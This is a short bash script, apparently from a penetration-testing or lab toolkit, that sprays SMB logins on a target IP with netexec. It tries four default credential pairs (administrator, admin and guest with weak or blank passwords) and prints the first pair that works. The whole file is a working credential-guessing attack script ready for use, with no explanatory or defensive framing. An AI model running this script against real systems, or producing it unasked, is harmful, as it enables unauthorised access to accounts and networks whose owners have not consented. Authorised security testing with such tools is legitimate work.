#!/bin/bash
# SMB Credential Spray via netexec
# Usage: smb_cred_spray.sh <TARGET_IP>
set -euo pipefail

TARGET_IP="${1:-127.0.0.1}"

echo "=== SMB Credential Spray ==="
for cred in administrator:password admin:admin guest: administrator:P@ssw0rd; do
  u=$(echo "$cred" | cut -d: -f1)
  p=$(echo "$cred" | cut -d: -f2)
  result=$(netexec smb "$TARGET_IP" -u "$u" -p "$p" 2>/dev/null)
  echo "$result"
  if echo "$result" | grep -q "+"; then
    echo "SMB_CRED_FOUND:$u:$p"
    exit 0
  fi
done
echo "SMB_SPRAY_FAILED"
